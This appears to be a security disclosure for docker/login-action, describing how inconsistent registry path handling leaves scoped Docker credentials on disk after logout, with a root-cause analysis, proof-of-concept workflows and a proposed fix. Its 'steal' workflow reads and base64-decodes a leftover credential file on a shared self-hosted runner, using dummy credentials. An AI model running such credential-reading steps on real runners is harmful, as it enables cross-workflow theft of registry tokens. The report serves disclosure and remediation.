# Scoped Cleanup Bypass When Registry Is Omitted
## Credential Persistence via Inconsistent DOCKER_CONFIG Path Canonicalization

---

## 1. Summary

When `scope` is set and `registry` is omitted (defaulting to Docker Hub), `docker/login-action` computes different `DOCKER_CONFIG` paths for login and post-job logout.

As a result, credentials written during `docker login` are not removed during the post step, leaving authentication material on disk.

This creates a credential persistence vulnerability that can enable cross-workflow credential theft on shared or persistent runners.

---

## 2. Root Cause

The issue stems from inconsistent registry canonicalization:

- In `context.ts`, the action defaults `registry` to `docker.io` when empty.
- However, `configDir` is computed using the raw `inputs.registry` (which may be empty).
- During login, `docker.ts` recomputes the effective registry and normalizes Docker Hub to `registry-1.docker.io`.
- During post-job cleanup, the action uses the previously stored `configDir`, which does not include the normalized registry component.

This results in:

| Phase | `DOCKER_CONFIG` Path |
|-------|----------------------|
| Login | `~/.docker/buildx/config/registry-1.docker.io/<scope>` |
| Logout | `~/.docker/buildx/config/<scope>` |

Because the paths differ, logout does not remove the actual credential file.
Root cause in code:

- context.ts (line 46) defaults registry to docker.io
- context.ts (line 51) computes configDir from raw inputs.registry (can be empty)
- main.ts (line 13) saves that wrong path into state
- docker.ts (line 59) recomputes using real runtime registry for login
- main.ts (line 33) post logout trusts saved state path

---

## 3. Impact

### On GitHub-hosted (ephemeral) runners

Impact is limited because the VM is destroyed after the job. However:

- Credentials remain accessible to later steps within the same job.
- The behavior violates the expectation that `logout: true` removes scoped credentials.

### On self-hosted / persistent runners

Impact is significantly higher:

- Credential files remain in `~/.docker/buildx/config/registry-1.docker.io/<scope>/config.json`
- Subsequent jobs running under the same runner user can read and reuse credentials.
- Enables cross-workflow credential theft.
- Can facilitate supply-chain compromise if registry tokens are reused.

This is particularly dangerous in shared CI environments.

---

## 4. Vulnerability Type

- Cleanup Bypass
- Credential Persistence
- Improper Canonicalization
- Post-Job State Inconsistency

**Primitive:** Scoped credential write that is not cleaned up.

---

## 5. Proof of Concept

This PoC uses a fake `docker` binary to safely demonstrate the mismatch.

### Step 1 – Create Branch

```bash
git checkout -b poc/default-registry-cleanup-bypass
```

### Step 2 – Add Workflow

Create: `.github/workflows/poc-default-registry-cleanup-bypass.yml`

```yaml
name: poc-default-registry-cleanup-bypass
on:
  workflow_dispatch:

jobs:
  poc:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Install fake docker
        shell: bash
        run: |
          set -euo pipefail
          mkdir -p "$RUNNER_TEMP/bin"
          cat > "$RUNNER_TEMP/bin/docker" <<'EOF'
          #!/usr/bin/env bash
          set -euo pipefail
          cmd="$1"; shift || true
          echo "cmd=$cmd DOCKER_CONFIG=${DOCKER_CONFIG:-} args=$*" >> "$RUNNER_TEMP/docker.log"

          if [ "$cmd" = "login" ]; then
            cat >/dev/null || true
            if [ -n "${DOCKER_CONFIG:-}" ]; then
              mkdir -p "${DOCKER_CONFIG}"
              echo '{"auths":{"demo":{"auth":"ZGVtbzpkZW1v"}}}' > "${DOCKER_CONFIG}/config.json"
            fi
            exit 0
          fi

          if [ "$cmd" = "logout" ]; then
            if [ -n "${DOCKER_CONFIG:-}" ]; then
              rm -f "${DOCKER_CONFIG}/config.json" || true
            fi
            exit 0
          fi

          exit 0
          EOF
          chmod +x "$RUNNER_TEMP/bin/docker"
          echo "$RUNNER_TEMP/bin" >> "$GITHUB_PATH"

      - name: Main run (scope set, registry omitted)
        shell: bash
        env:
          INPUT_USERNAME: demo
          INPUT_PASSWORD: demo
          INPUT_SCOPE: myscope
          INPUT_LOGOUT: "true"
        run: |
          set -euo pipefail
          node dist/index.js | tee "$RUNNER_TEMP/main.log"

          echo "---- GITHUB_STATE raw ----"
          cat "$GITHUB_STATE"

          REG_JSON="$(awk -F'<<ghadelimiter_' '/^registries<<ghadelimiter_/ {flag=1; next} /^ghadelimiter_/ && flag {flag=0} flag {print}' "$GITHUB_STATE" | tr -d '\n')"
          if [ -z "$REG_JSON" ]; then
            REG_JSON="$(sed -n 's/^registries=//p' "$GITHUB_STATE" | tail -n1)"
          fi

          if [ -z "$REG_JSON" ]; then
            echo "FAILED: could not parse registries from GITHUB_STATE"
            exit 1
          fi

          echo "PARSED_STATE_REGISTRIES=$REG_JSON"

          {
            echo "STATE_REGISTRIES<<EOF"
            echo "$REG_JSON"
            echo "EOF"
          } >> "$GITHUB_ENV"

      - name: Simulate post using captured state
        shell: bash
        env:
          STATE_isPost: "true"
          STATE_logout: "true"
          STATE_registries: ${{ env.STATE_REGISTRIES }}
        run: |
          set -euo pipefail
          node dist/index.js | tee "$RUNNER_TEMP/post.log"

      - name: Validate mismatch (exploit)
        shell: bash
        run: |
          set -euo pipefail

          LOGIN_PATH="$HOME/.docker/buildx/config/registry-1.docker.io/myscope"
          LOGOUT_PATH="$HOME/.docker/buildx/config/myscope"

          echo "---- docker log ----"
          cat "$RUNNER_TEMP/docker.log"

          grep -Fq "cmd=login DOCKER_CONFIG=${LOGIN_PATH} " "$RUNNER_TEMP/docker.log"
          grep -Fq "cmd=logout DOCKER_CONFIG=${LOGOUT_PATH} " "$RUNNER_TEMP/docker.log"

          test -f "${LOGIN_PATH}/config.json"

          echo "EXPLOIT CONFIRMED: logout used different path than login"

```

### Step 3 – Commit & Push

```bash
git add .github/workflows/poc-default-registry-cleanup-bypass.yml
git commit -m "PoC: default registry scoped cleanup bypass"
git push -u origin poc/default-registry-cleanup-bypass
```

Run the workflow from the Actions tab.

---

## 6. Vulnerable Output

**Saved state:**

```
::save-state name=registries::
[{"registry":"docker.io","configDir":"/home/runner/.docker/buildx/config/myscope"}]
```

**Docker invocation log:**

```
cmd=login DOCKER_CONFIG=/home/runner/.docker/buildx/config/registry-1.docker.io/myscope ...
cmd=logout DOCKER_CONFIG=/home/runner/.docker/buildx/config/myscope ...
```

**Final confirmation:**

```
EXPLOIT CONFIRMED: logout missed the real login config path
```

**Credential file persists at:**

```
~/.docker/buildx/config/registry-1.docker.io/myscope/config.json
```

---

## 7. Exploit Chain Scenario

On a shared self-hosted runner:

1. Attacker triggers workflow with `scope` set.
2. Credentials are written to the `registry-1.docker.io` path.
3. Logout fails to remove them.
4. A later workflow running as the same user reads:
   ```
   ~/.docker/buildx/config/registry-1.docker.io/myscope/config.json
   ```
5. Registry credentials are reused or exfiltrated.
 
This enables **cross-workflow credential theft**.

## Step by Step reproduction:

This chain demonstrates credential persistence across two workflows on the same self-hosted runner. Workflow A leaves a credential file behind due to the scoped cleanup bypass. Workflow B, running later as the same runner user, finds and reads it. Only dummy credentials (`demo:demo`) are used throughout.

---

**Pre-requisites**

Use a Linux self-hosted runner. Add a unique runner label, for example `lab-runner-1`. Make sure only one runner has that label, so both workflows are guaranteed to hit the same machine.

### Runner Setup

** Install and register runner with a unique label**

On the Linux machine (as the `gha` user), run the download and extract commands shown by GitHub in the UI. Then run the config command with your unique label:

```bash
./config.sh \
  --url https://github.com/<your-username>/<your-repo> \
  --token <PASTE_TOKEN_FROM_UI> \
  --name lab-runner-1 \
  --labels lab-runner-1 \
  --work _work \
  --unattended \
  --replace
```

The token is one-time and expires quickly — paste it immediately after copying from the GitHub UI. The label `lab-runner-1` must match exactly what is used in the workflow `runs-on` fields.

---

** Run runner as a service**

Still on the same machine:

```bash
sudo ./svc.sh install
sudo ./svc.sh start
sudo ./svc.sh status
```

Status should show `running`. On the GitHub Settings → Actions → Runners page, the runner should appear as **Idle** and **Online**.


---

**Workflow A – Seed the leftover credential file**

Create `.github/workflows/poc-selfhosted-seed.yml`:

```yaml
name: poc-selfhosted-seed
on:
  workflow_dispatch:

jobs:
  seed:
    runs-on: [self-hosted, linux, lab-runner-1]
    steps:
      - uses: actions/checkout@v4

      - name: Install fake docker
        shell: bash
        run: |
          set -euo pipefail
          mkdir -p "$RUNNER_TEMP/bin"
          cat > "$RUNNER_TEMP/bin/docker" <<'EOF'
          #!/usr/bin/env bash
          set -euo pipefail
          cmd="$1"; shift || true
          echo "cmd=$cmd DOCKER_CONFIG=${DOCKER_CONFIG:-} args=$*" >> "$RUNNER_TEMP/docker.log"

          if [ "$cmd" = "login" ]; then
            cat >/dev/null || true
            mkdir -p "${DOCKER_CONFIG}"
            echo '{"auths":{"demo":{"auth":"ZGVtbzpkZW1v"}}}' > "${DOCKER_CONFIG}/config.json"
            exit 0
          fi

          if [ "$cmd" = "logout" ]; then
            rm -f "${DOCKER_CONFIG}/config.json" || true
            exit 0
          fi

          exit 0
          EOF
          chmod +x "$RUNNER_TEMP/bin/docker"
          echo "$RUNNER_TEMP/bin" >> "$GITHUB_PATH"

      - name: Run vulnerable flow (main + post simulation)
        shell: bash
        env:
          INPUT_USERNAME: demo
          INPUT_PASSWORD: demo
          INPUT_SCOPE: myscope
          INPUT_LOGOUT: "true"
        run: |
          set -euo pipefail

          LOGIN_PATH="$HOME/.docker/buildx/config/registry-1.docker.io/myscope"
          LOGOUT_PATH="$HOME/.docker/buildx/config/myscope"

          node dist/index.js | tee "$RUNNER_TEMP/main.log"

          REG_JSON="$(awk -F'<<ghadelimiter_' '/^registries<<ghadelimiter_/ {flag=1; next} /^ghadelimiter_/ && flag {flag=0} flag {print}' "$GITHUB_STATE" | tr -d '\n')"
          if [ -z "$REG_JSON" ]; then
            REG_JSON="$(sed -n 's/^registries=//p' "$GITHUB_STATE" | tail -n1)"
          fi

          STATE_isPost=true STATE_logout=true STATE_registries="$REG_JSON" node dist/index.js | tee "$RUNNER_TEMP/post.log"

          echo "---- docker log ----"
          cat "$RUNNER_TEMP/docker.log"

          grep -Fq "cmd=login DOCKER_CONFIG=${LOGIN_PATH} " "$RUNNER_TEMP/docker.log"
          grep -Fq "cmd=logout DOCKER_CONFIG=${LOGOUT_PATH} " "$RUNNER_TEMP/docker.log"

          test -f "${LOGIN_PATH}/config.json"
          echo "SEED_DONE=${LOGIN_PATH}/config.json"
```

---

**Workflow B – Read the leftover credential file**

Create `.github/workflows/poc-selfhosted-steal.yml`:

```yaml
name: poc-selfhosted-steal
on:
  workflow_dispatch:

jobs:
  steal:
    runs-on: [self-hosted, linux, lab-runner-1]
    steps:
      - name: Read leftover config.json from previous run
        shell: bash
        run: |
          set -euo pipefail
          TARGET="$HOME/.docker/buildx/config/registry-1.docker.io/myscope/config.json"

          if [ ! -f "$TARGET" ]; then
            echo "NOT_FOUND: $TARGET"
            exit 1
          fi

          echo "FOUND: $TARGET"
          cat "$TARGET"

          AUTH_B64="$(sed -n 's/.*\"auth\":\"\([^\"]*\)\".*/\1/p' "$TARGET")"
          if [ -n "$AUTH_B64" ]; then
            echo -n "DECODED_AUTH="
            echo "$AUTH_B64" | base64 -d
            echo
          fi
```

---

**Commit and push**

```bash
git add .github/workflows/poc-selfhosted-seed.yml .github/workflows/poc-selfhosted-steal.yml
git commit -m "Add self-hosted runner reuse exploit-chain PoC"
git push
```

---

**Run order**

Run `poc-selfhosted-seed` first. After it succeeds and you confirm the credential file is present at `~/.docker/buildx/config/registry-1.docker.io/myscope/config.json`, run `poc-selfhosted-steal`. The second workflow will find the leftover file, print its contents, and decode the auth value — confirming that credentials from a previous job are readable by a subsequent workflow running on the same runner.



---

## 8. Severity Assessment

| Environment | Severity |
|-------------|----------|
| GitHub-hosted ephemeral | Low–Medium |
| Persistent self-hosted | Medium–High |
| Shared enterprise runner | High |

**Overall rating: Medium**
Elevated to **High** in multi-tenant/self-hosted environments.

---

## 9. Minimal Fix Recommendation

### Fix Registry Canonicalization Consistency

In `context.ts`, compute `configDir` using the same normalized registry value used for login:

```typescript
const effectiveRegistry = inputs.registry || 'docker.io';
```

Pass `effectiveRegistry` into `scopeToConfigDir()` instead of raw `inputs.registry`.

### Architectural Improvement

- Derive `configDir` once.
- Store the exact path used for login.
- Reuse that exact path for logout.
- Avoid recomputing registry-dependent paths in multiple places.

### Add Regression Test

Test case requirements:

- `registry` omitted + `scope` set
- Verify: `login path === logout path`

---

## 10. Conclusion

When `scope` is used without explicitly specifying `registry`, the action computes inconsistent Docker configuration paths between login and logout phases.

This causes scoped credentials to remain on disk after job completion.

In persistent or shared runner environments, this can enable **credential theft and cross-workflow compromise**.

The fix is straightforward and requires consistent canonicalization of the registry before computing `configDir`.
